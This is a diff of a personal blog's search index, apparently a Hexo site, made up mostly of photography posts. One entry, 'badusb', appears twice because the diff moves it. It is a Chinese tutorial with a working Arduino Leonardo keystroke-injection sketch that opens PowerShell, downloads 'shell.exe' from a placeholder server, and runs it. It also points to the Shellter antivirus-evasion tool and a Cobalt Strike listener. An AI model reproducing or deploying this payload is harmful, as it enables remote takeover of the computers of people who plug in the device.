@@ -1,6 +1,48 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>badusb</title>
+    <url>/2023/06/02/badusb/</url>
+    <content><![CDATA[<h1>Arduino  Leonardo 制作badusb</h1>
+<h3 id="badusb是什么❓">Badusb是什么❓</h3>
+<p>计算机或者其它设备&quot;承认&quot;我们插入的硬件为键盘鼠标，Leonardo就可以模拟键盘鼠标操作，输入一些指令。</p>
+<h3 id="arduino-leonardo-什么样子？">Arduino  Leonardo 什么样子？</h3>
+<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/1685543471012-81399cab-d581-4e7b-af3c-8be196c33da3.jpeg" alt="IMG_9809.jpeg" style="zoom: 25%;" />
+<h3 id="arduino-ide-下载">arduino IDE 下载</h3>
+<p><a href="https://www.arduino.cc/en/software">下载链接</a></p>
+<h3 id="免杀工具shellter下载">免杀工具shellter下载</h3>
+<p><a href="https://www.shellterproject.com/download/">下载链接</a></p>
+<h3 id="badusb-代码">badusb 代码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line">void setup() </span><br><span class="line">&#123;</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);</span><br><span class="line">    Keyboard.begin();</span><br><span class="line">    delay(<span class="number">5000</span>);</span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI); // 模拟按下 Windows 键</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;r&#x27;</span>); // 模拟按下 R 键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK); //利用开大写输小写绕过输入法</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);//</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;powershell&quot;</span>); // 输入 powershell 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$url = \&quot;http://ip/shell.exe\&quot;&quot;</span>);  //输入远程服务器上的程序路径</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$filePath = \&quot;$env:USERPROFILE\\Desktop\\shell.exe\&quot;&quot;</span>);  //安装目录 </span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Invoke-WebRequest -Uri  $url  -OutFile  $filePath&quot;</span>); // 输入下载命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Start-Process  -FilePath  $filePath&quot;</span>); // 输入执行命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;exit&quot;</span>); // 输入 exit 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    Keyboard.end(); // 结束键盘通讯</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">// 空循环</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="然后利用cs监听上线即可">然后利用cs监听上线即可</h4>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/image-20230602112516109.png" alt="image-20230602112516109"></p>
+]]></content>
+      <tags>
+        <tag>硬件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>南澳西涌&amp;长曝光</title>
+    <url>/2023/03/21/%E4%B8%9C%E6%B6%8C-%E9%95%BF%E6%9B%9D%E5%85%89/</url>
+    <content><![CDATA[<blockquote>
+<p>长曝光参数 光圈f13与30S长曝光</p>
+</blockquote>
+<p><img src="https://p.ipic.vip/ic76en.jpg" alt="DSC04258"></p>
+<p><img src="https://p.ipic.vip/svmhf5.jpg" alt="DSC04265"></p>
+<p><img src="https://p.ipic.vip/ypk8fo.jpg" alt="DSC04397"></p>
+<p><img src="https://p.ipic.vip/xemlsz.jpg" alt="DSC04424"></p>
+<p><img src="https://p.ipic.vip/bkr9v8.jpg" alt="DSC04430"></p>
+<p><img src="https://p.ipic.vip/hrlfpv.jpg" alt="DSC04455"></p>
+<p><img src="https://p.ipic.vip/a8vfww.jpg" alt="DSC04456"></p>
+]]></content>
+      <categories>
+        <category>高山</category>
+      </categories>
+      <tags>
+        <tag>长曝光</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>子夜幻影</title>
     <url>/2023/03/12/%E5%AD%90%E5%A4%9C%E5%B9%BB%E5%BD%B1/</url>
     <content><![CDATA[<h1>子夜幻影</h1>
@@ -16,6 +58,24 @@
       </categories>
       <tags>
         <tag>慢快门</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>抽象派</title>
+    <url>/2023/03/14/%E6%8A%BD%E8%B1%A1%E6%B4%BE/</url>
+    <content><![CDATA[<h1>抽象派</h1>
+<blockquote>
+<p>用大光圈去拍摄，把焦点对焦大约在60cm处，晚上拍摄灯光，应有戏剧性的抽象效果。</p>
+</blockquote>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04186.png" alt=""></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04187.png" alt=""></p>
+<p><img src="https://p.ipic.vip/aqy0m6.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>灯光</category>
+      </categories>
+      <tags>
+        <tag>大光圈</tag>
       </tags>
   </entry>
   <entry>
@@ -77,66 +137,6 @@
       </tags>
   </entry>
   <entry>
-    <title>badusb</title>
-    <url>/2023/06/02/badusb/</url>
-    <content><![CDATA[<h1>Arduino  Leonardo 制作badusb</h1>
-<h3 id="badusb是什么❓">Badusb是什么❓</h3>
-<p>计算机或者其它设备&quot;承认&quot;我们插入的硬件为键盘鼠标，Leonardo就可以模拟键盘鼠标操作，输入一些指令。</p>
-<h3 id="arduino-leonardo-什么样子？">Arduino  Leonardo 什么样子？</h3>
-<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/1685543471012-81399cab-d581-4e7b-af3c-8be196c33da3.jpeg" alt="IMG_9809.jpeg" style="zoom: 25%;" />
-<h3 id="arduino-ide-下载">arduino IDE 下载</h3>
-<p><a href="https://www.arduino.cc/en/software">下载链接</a></p>
-<h3 id="免杀工具shellter下载">免杀工具shellter下载</h3>
-<p><a href="https://www.shellterproject.com/download/">下载链接</a></p>
-<h3 id="badusb-代码">badusb 代码</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line">void setup() </span><br><span class="line">&#123;</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);</span><br><span class="line">    Keyboard.begin();</span><br><span class="line">    delay(<span class="number">5000</span>);</span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI); // 模拟按下 Windows 键</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;r&#x27;</span>); // 模拟按下 R 键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK); //利用开大写输小写绕过输入法</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);//</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;powershell&quot;</span>); // 输入 powershell 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$url = \&quot;http://ip/shell.exe\&quot;&quot;</span>);  //输入远程服务器上的程序路径</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$filePath = \&quot;$env:USERPROFILE\\Desktop\\shell.exe\&quot;&quot;</span>);  //安装目录 </span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Invoke-WebRequest -Uri  $url  -OutFile  $filePath&quot;</span>); // 输入下载命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Start-Process  -FilePath  $filePath&quot;</span>); // 输入执行命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;exit&quot;</span>); // 输入 exit 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    Keyboard.end(); // 结束键盘通讯</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">// 空循环</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="然后利用cs监听上线即可">然后利用cs监听上线即可</h4>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/image-20230602112516109.png" alt="image-20230602112516109"></p>
-]]></content>
-      <tags>
-        <tag>硬件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>抽象派</title>
-    <url>/2023/03/14/%E6%8A%BD%E8%B1%A1%E6%B4%BE/</url>
-    <content><![CDATA[<h1>抽象派</h1>
-<blockquote>
-<p>用大光圈去拍摄，把焦点对焦大约在60cm处，晚上拍摄灯光，应有戏剧性的抽象效果。</p>
-</blockquote>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04186.png" alt=""></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04187.png" alt=""></p>
-<p><img src="https://p.ipic.vip/aqy0m6.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>灯光</category>
-      </categories>
-      <tags>
-        <tag>大光圈</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>斗艳</title>
-    <url>/2023/03/26/%E6%A4%8D%E7%89%A9%E7%95%8C/</url>
-    <content><![CDATA[<blockquote>
-<p>雨🌧</p>
-</blockquote>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04678.jpg" alt=""></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04677.jpg" alt=""></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04664.jpg" alt=""></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04676.jpg" alt=""></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04661.jpg" alt=""></p>
-<p><img src="https://p.ipic.vip/44dbb0.jpg" alt=""></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04610.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>植物界</category>
-      </categories>
-      <tags>
-        <tag>花</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>桂湾</title>
     <url>/2023/06/12/%E6%A1%82%E6%B9%BE/</url>
     <content><![CDATA[<h1>20230611PM</h1>
@@ -161,6 +161,23 @@
 ]]></content>
       <tags>
         <tag>黄昏</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>改变视角</title>
+    <url>/2023/03/27/%E6%A4%8D%E7%89%A9%E7%95%8C2/</url>
+    <content><![CDATA[<blockquote>
+<p>低视角拍摄</p>
+</blockquote>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04602.jpg" alt=""><br>
+<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04596.jpg" alt=""><br>
+<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04625.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>植物界</category>
+      </categories>
+      <tags>
+        <tag>林</tag>
       </tags>
   </entry>
   <entry>
@@ -191,38 +208,40 @@
       </tags>
   </entry>
   <entry>
-    <title>南澳西涌&amp;长曝光</title>
-    <url>/2023/03/21/%E4%B8%9C%E6%B6%8C-%E9%95%BF%E6%9B%9D%E5%85%89/</url>
-    <content><![CDATA[<blockquote>
-<p>长曝光参数 光圈f13与30S长曝光</p>
-</blockquote>
-<p><img src="https://p.ipic.vip/ic76en.jpg" alt="DSC04258"></p>
-<p><img src="https://p.ipic.vip/svmhf5.jpg" alt="DSC04265"></p>
-<p><img src="https://p.ipic.vip/ypk8fo.jpg" alt="DSC04397"></p>
-<p><img src="https://p.ipic.vip/xemlsz.jpg" alt="DSC04424"></p>
-<p><img src="https://p.ipic.vip/bkr9v8.jpg" alt="DSC04430"></p>
-<p><img src="https://p.ipic.vip/hrlfpv.jpg" alt="DSC04455"></p>
-<p><img src="https://p.ipic.vip/a8vfww.jpg" alt="DSC04456"></p>
+    <title>拍摄</title>
+    <url>/2022/06/12/%E7%85%A7%E7%89%87/</url>
+    <content><![CDATA[<h2 id="拍摄设备">拍摄设备</h2>
+<ul>
+<li>松下 GX9,  SONY A7M4</li>
+<li>镜头 :松下14-140mm，小蚁12-40mm，松下25mm f1.7，松莱25mm f1.4，适马 28-70 mm f2.8</li>
+</ul>
 ]]></content>
       <categories>
-        <category>高山</category>
+        <category>相机📷参数</category>
       </categories>
       <tags>
-        <tag>长曝光</tag>
+        <tag>设备清单</tag>
       </tags>
   </entry>
   <entry>
-    <title>珠海</title>
-    <url>/2023/05/05/%E7%8F%A0%E6%B5%B7/</url>
-    <content><![CDATA[<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC06063.jpg" alt="DSC06063"></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC06137.jpg" alt="DSC06137"></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC06231.jpg" alt="DSC06231"></p>
+    <title>斗艳</title>
+    <url>/2023/03/26/%E6%A4%8D%E7%89%A9%E7%95%8C/</url>
+    <content><![CDATA[<blockquote>
+<p>雨🌧</p>
+</blockquote>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04678.jpg" alt=""></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04677.jpg" alt=""></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04664.jpg" alt=""></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04676.jpg" alt=""></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04661.jpg" alt=""></p>
+<p><img src="https://p.ipic.vip/44dbb0.jpg" alt=""></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04610.jpg" alt=""></p>
 ]]></content>
       <categories>
-        <category>长曝光</category>
+        <category>植物界</category>
       </categories>
       <tags>
-        <tag>珠海</tag>
+        <tag>花</tag>
       </tags>
   </entry>
   <entry>
@@ -242,6 +261,20 @@
       </tags>
   </entry>
   <entry>
+    <title>珠海</title>
+    <url>/2023/05/05/%E7%8F%A0%E6%B5%B7/</url>
+    <content><![CDATA[<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC06063.jpg" alt="DSC06063"></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC06137.jpg" alt="DSC06137"></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC06231.jpg" alt="DSC06231"></p>
+]]></content>
+      <categories>
+        <category>长曝光</category>
+      </categories>
+      <tags>
+        <tag>珠海</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>空气压缩</title>
     <url>/2023/06/02/%E7%A9%BA%E6%B0%94%E5%8E%8B%E7%BC%A9/</url>
     <content><![CDATA[<blockquote>
@@ -252,39 +285,6 @@
 ]]></content>
       <tags>
         <tag>长焦</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>拍摄</title>
-    <url>/2022/06/12/%E7%85%A7%E7%89%87/</url>
-    <content><![CDATA[<h2 id="拍摄设备">拍摄设备</h2>
-<ul>
-<li>松下 GX9,  SONY A7M4</li>
-<li>镜头 :松下14-140mm，小蚁12-40mm，松下25mm f1.7，松莱25mm f1.4，适马 28-70 mm f2.8</li>
-</ul>
-]]></content>
-      <categories>
-        <category>相机📷参数</category>
-      </categories>
-      <tags>
-        <tag>设备清单</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>改变视角</title>
-    <url>/2023/03/27/%E6%A4%8D%E7%89%A9%E7%95%8C2/</url>
-    <content><![CDATA[<blockquote>
-<p>低视角拍摄</p>
-</blockquote>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04602.jpg" alt=""><br>
-<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04596.jpg" alt=""><br>
-<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04625.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>植物界</category>
-      </categories>
-      <tags>
-        <tag>林</tag>
       </tags>
   </entry>
 </search>
